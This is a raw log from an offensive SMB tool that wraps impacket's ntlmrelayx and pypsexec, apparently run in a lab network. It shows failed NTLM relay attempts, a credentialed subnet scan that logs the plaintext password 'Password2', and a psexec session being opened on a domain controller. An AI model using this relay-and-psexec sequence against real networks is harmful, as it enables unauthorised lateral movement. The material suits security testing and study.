2021-10-13 15:00:54.936 | INFO     | project.RelayAttacks.relayattacks:do_smb_relay:69 - Starting smb relay attack using ip: 192.168.253.134 ipv6:fe80::20c:29ff:fe89:df69
2021-10-14 09:55:02.122 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client SMTP loaded..
2021-10-14 09:55:02.139 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client SMB loaded..
2021-10-14 09:55:02.195 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client DCSYNC loaded..
2021-10-14 09:55:02.197 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client IMAP loaded..
2021-10-14 09:55:02.198 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client IMAPS loaded..
2021-10-14 09:55:02.204 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client MSSQL loaded..
2021-10-14 09:55:02.239 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client LDAPS loaded..
2021-10-14 09:55:02.240 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client LDAP loaded..
2021-10-14 09:55:02.240 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client HTTP loaded..
2021-10-14 09:55:02.241 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client HTTPS loaded..
2021-10-14 09:55:02.244 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client RPC loaded..
2021-10-14 09:55:02.371 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:run:838 - Setting up SMB Server
2021-10-14 09:56:35.958 | INFO     | project.RelayAttacks.relayattacks:do_smb_relay:69 - Starting smb relay attack using ip: 192.168.253.134 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-10-14 09:56:35.961 | INFO     | project.igris:check_settable_variables_value:185 - Checking the correct value of the necessary settable variables 
2021-10-14 09:56:36.053 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client SMTP loaded..
2021-10-14 09:56:36.072 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client SMB loaded..
2021-10-14 09:56:36.130 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client DCSYNC loaded..
2021-10-14 09:56:36.134 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client IMAPS loaded..
2021-10-14 09:56:36.135 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client IMAP loaded..
2021-10-14 09:56:36.144 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client MSSQL loaded..
2021-10-14 09:56:36.180 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client LDAPS loaded..
2021-10-14 09:56:36.180 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client LDAP loaded..
2021-10-14 09:56:36.181 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client HTTP loaded..
2021-10-14 09:56:36.181 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client HTTPS loaded..
2021-10-14 09:56:36.184 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client RPC loaded..
2021-10-14 10:01:10.091 | INFO     | project.RelayAttacks.relayattacks:do_smb_relay:69 - Starting smb relay attack using ip: 192.168.253.134 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-10-14 10:01:10.093 | INFO     | project.igris:check_settable_variables_value:185 - Checking the correct value of the necessary settable variables 
2021-10-14 10:01:10.191 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client SMTP loaded..
2021-10-14 10:01:10.211 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client SMB loaded..
2021-10-14 10:01:10.264 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client DCSYNC loaded..
2021-10-14 10:01:10.268 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client IMAP loaded..
2021-10-14 10:01:10.269 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client IMAPS loaded..
2021-10-14 10:01:10.274 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client MSSQL loaded..
2021-10-14 10:01:10.310 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client LDAP loaded..
2021-10-14 10:01:10.311 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client LDAPS loaded..
2021-10-14 10:01:10.312 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client HTTP loaded..
2021-10-14 10:01:10.313 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client HTTPS loaded..
2021-10-14 10:01:10.317 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client RPC loaded..
2021-10-14 10:01:10.424 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:run:838 - Setting up SMB Server
2021-10-14 10:01:18.105 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smbComTreeConnectAndX:712 - SMBD-Thread-6: Connection from RSGBENGICORP/APUIA@192.168.253.129 controlled, attacking target smb://192.168.253.129
2021-10-14 10:01:18.235 | ERROR    | impacket.examples.ntlmrelayx.servers.smbrelayserver:SmbSessionSetupAndX:568 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/APUIA FAILED
2021-10-14 10:03:05.598 | INFO     | project.smb.scan:do_scan:590 - Starting scan command using user: apuia passwd: Password2 subnet: 192.168.253.0/24
2021-10-14 10:03:05.600 | INFO     | project.igris:check_settable_variables_value:185 - Checking the correct value of the necessary settable variables 
2021-10-14 10:03:05.601 | INFO     | project.smb.scan:synchronous_way:523 - Using synchronous scan
2021-10-14 10:03:05.603 | INFO     | project.smb.scan:set_up_scan_actions_synchronous:495 - Starting to launch threads based on your cpu
2021-10-14 10:03:47.779 | INFO     | project.smb.scan:try_scan_connection_with_smb1:51 - Connection success using smb1 at 192.168.253.129
2021-10-14 10:03:47.989 | INFO     | project.smb.scan:check_scan_login_possibility:105 - Login successful at 192.168.253.129
2021-10-14 10:03:47.991 | INFO     | project.smb.scan:configure_target_info_of_scan:149 - Loading target info of PC-ALEX at 192.168.253.129
2021-10-14 10:03:48.093 | INFO     | project.smb.scan:check_psexec_possibility:171 - Possibility of psexec on PC-ALEX at 192.168.253.129
2021-10-14 10:03:48.094 | INFO     | project.smb.scan:store_scan_results:123 - Saving scan information
2021-10-14 10:03:48.098 | INFO     | project.smb.scan:try_scan_connection_with_smb1:51 - Connection success using smb1 at 192.168.253.134
2021-10-14 10:03:48.139 | INFO     | project.smb.scan:check_scan_login_possibility:105 - Login successful at 192.168.253.134
2021-10-14 10:03:48.140 | INFO     | project.smb.scan:configure_target_info_of_scan:149 - Loading target info of DC-COMPANY at 192.168.253.134
2021-10-14 10:03:48.147 | INFO     | project.smb.scan:check_psexec_possibility:175 - Error of psexec on DC-COMPANY at 192.168.253.134
2021-10-14 10:03:48.149 | INFO     | project.smb.scan:store_scan_results:123 - Saving scan information
2021-10-14 10:04:29.954 | SUCCESS  | project.smb.scan:set_up_scan_actions_synchronous:516 - Synchronous scanning has been completed
2021-10-14 10:04:39.377 | INFO     | project.smb.scan:do_scan:590 - Starting scan command using user: apuia passwd: Password2 subnet: 192.168.253.0/24
2021-10-14 10:04:39.379 | INFO     | project.smb.scan:show_scan_info:232 - Starting to show all the scan info of the different subnets using user: apuia passwd: Password2
2021-10-14 10:04:55.686 | INFO     | project.RelayAttacks.relayattacks:do_smb_relay:69 - Starting smb relay attack using ip: 192.168.253.134 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-10-14 10:04:55.689 | INFO     | project.igris:check_settable_variables_value:185 - Checking the correct value of the necessary settable variables 
2021-10-14 10:04:55.786 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client SMTP loaded..
2021-10-14 10:04:55.809 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client SMB loaded..
2021-10-14 10:04:55.871 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client DCSYNC loaded..
2021-10-14 10:04:55.875 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client IMAP loaded..
2021-10-14 10:04:55.877 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client IMAPS loaded..
2021-10-14 10:04:55.885 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client MSSQL loaded..
2021-10-14 10:04:55.986 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client LDAPS loaded..
2021-10-14 10:04:55.987 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client LDAP loaded..
2021-10-14 10:04:55.988 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client HTTP loaded..
2021-10-14 10:04:55.989 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client HTTPS loaded..
2021-10-14 10:04:55.991 | INFO     | impacket.examples.ntlmrelayx.clients:<module>:121 - Protocol Client RPC loaded..
2021-10-14 10:04:56.039 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:run:838 - Setting up SMB Server
2021-10-14 10:05:04.538 | INFO     | impacket.examples.ntlmrelayx.servers.smbrelayserver:smbComTreeConnectAndX:712 - SMBD-Thread-9: Connection from RSGBENGICORP/APUIA@192.168.253.129 controlled, attacking target smb://192.168.253.129
2021-10-14 10:05:04.562 | ERROR    | impacket.examples.ntlmrelayx.servers.smbrelayserver:SmbSessionSetupAndX:568 - Authenticating against smb://192.168.253.129 as RSGBENGICORP/APUIA FAILED
2021-10-14 10:06:25.143 | INFO     | project.smb.psexec:do_psexec:455 - Starting psexec with the user apuia and the password Password2 in 192.168.253.134
2021-10-14 10:06:25.143 | INFO     | project.igris:check_settable_variables_value:185 - Checking the correct value of the necessary settable variables 
2021-10-14 10:06:25.144 | INFO     | smbprotocol.connection:__init__:628 - Initialising connection, guid: 2cc0e2cc-9d44-42f9-9154-1d11b6efbdc9, require_signing: True, server_name: 192.168.253.134, port: 445
2021-10-14 10:06:25.145 | INFO     | smbprotocol.session:__init__:216 - Initialising session with username: apuia
2021-10-14 10:06:25.145 | INFO     | pypsexec.client:__init__:90 - Creating PyPsexec Client with unique name: PAExec-11986-igris
2021-10-14 10:06:25.146 | INFO     | pypsexec.client:__init__:99 - Generated unique ID for PyPsexec Client: 6762171
2021-10-14 10:06:25.147 | INFO     | pypsexec.client:connect:104 - Setting up SMB Connection to 192.168.253.134:445
2021-10-14 10:06:25.147 | INFO     | smbprotocol.connection:connect:716 - Setting up transport connection
2021-10-14 10:06:25.147 | INFO     | smbprotocol.transport:connect:65 - Connecting to DirectTcp socket
2021-10-14 10:06:25.150 | INFO     | smbprotocol.connection:connect:724 - Starting negotiation with SMB server
2021-10-14 10:06:25.151 | INFO     | smbprotocol.connection:_send_smb2_negotiate:1303 - Negotiating with SMB2 protocol with highest client dialect of: SMB_3_1_1
2021-10-14 10:06:25.154 | INFO     | smbprotocol.connection:_send_smb2_negotiate:1356 - Sending SMB2 Negotiate message
2021-10-14 10:06:25.164 | INFO     | smbprotocol.connection:_send_smb2_negotiate:1361 - Receiving SMB2 Negotiate response
2021-10-14 10:06:25.169 | INFO     | smbprotocol.connection:connect:726 - Negotiated dialect: (785) SMB_3_1_1
2021-10-14 10:06:25.169 | INFO     | smbprotocol.connection:connect:739 - Connection require signing: True
2021-10-14 10:06:25.170 | INFO     | pypsexec.client:connect:107 - Authenticating SMB Session
2021-10-14 10:06:25.176 | INFO     | smbprotocol.session:connect:287 - Sending SMB2_SESSION_SETUP request message
2021-10-14 10:06:25.177 | INFO     | smbprotocol.session:connect:290 - Receiving SMB2_SESSION_SETUP response message
2021-10-14 10:06:25.183 | INFO     | smbprotocol.session:connect:313 - More processing is required for SMB2_SESSION_SETUP
2021-10-14 10:06:25.188 | INFO     | smbprotocol.session:connect:287 - Sending SMB2_SESSION_SETUP request message
2021-10-14 10:06:25.190 | INFO     | smbprotocol.session:connect:290 - Receiving SMB2_SESSION_SETUP response message
2021-10-14 10:06:25.197 | INFO     | smbprotocol.session:connect:317 - Setting session id to 642114790621305
2021-10-14 10:06:25.197 | INFO     | smbprotocol.session:connect:374 - Verifying the SMB Setup Session signature as auth is successful
2021-10-14 10:06:25.198 | INFO     | pypsexec.client:connect:109 - Opening handle to SCMR and PAExec service
2021-10-14 10:06:25.198 | INFO     | pypsexec.scmr:open:286 - Opening handle for SCMR on 192.168.253.134
2021-10-14 10:06:25.199 | INFO     | smbprotocol.tree:connect:231 - Session: apuia - Creating connection to share \\192.168.253.134\IPC$
2021-10-14 10:06:25.199 | INFO     | smbprotocol.tree:connect:237 - Session: apuia - Sending Tree Connect message
2021-10-14 10:06:25.202 | INFO     | smbprotocol.tree:connect:243 - Session: apuia - Receiving Tree Connect response
2021-10-14 10:06:25.206 | INFO     | smbprotocol.tree:connect:252 - Session: apuia - Created tree connection with ID 1
2021-10-14 10:06:25.206 | INFO     | smbprotocol.tree:_verify_dialect_negotiate:305 - Session: apuia, Tree: \\192.168.253.134\IPC$ - Running secure negotiate process
2021-10-14 10:06:25.208 | INFO     | smbprotocol.open:create:1205 - Session: apuia, Tree Connect: \\192.168.253.134\IPC$ - sending SMB2 Create Request for file svcctl
2021-10-14 10:06:25.211 | INFO     | smbprotocol.open:_create_response:1217 - Session: apuia, Tree Connect: \\192.168.253.134\IPC$ - receiving SMB2 Create Response
